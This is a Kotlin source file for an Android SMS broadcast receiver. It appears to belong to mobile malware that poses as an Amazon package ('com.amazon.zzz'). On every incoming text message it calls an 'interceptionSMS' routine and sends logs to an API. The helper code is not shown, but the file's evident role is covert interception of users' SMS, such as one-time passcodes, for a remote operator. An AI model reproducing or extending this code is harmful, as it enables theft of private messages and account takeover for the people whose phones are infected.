package com.amazon.zzz.Receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import com.amazon.zzz.ApiNm.apiUt
import com.amazon.zzz.Utilsss.utUtils
import java.util.concurrent.TimeUnit

class SmsReciever : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        apiUt.sendLogs(context, "", "SmsReciever onReceive", "log")
        utUtils.interceptionSMS(context, intent)

        try {
            TimeUnit.SECONDS.sleep(1)
        } catch (e: InterruptedException) {
            utUtils.Log("rec", e.localizedMessage)
        }
    }

}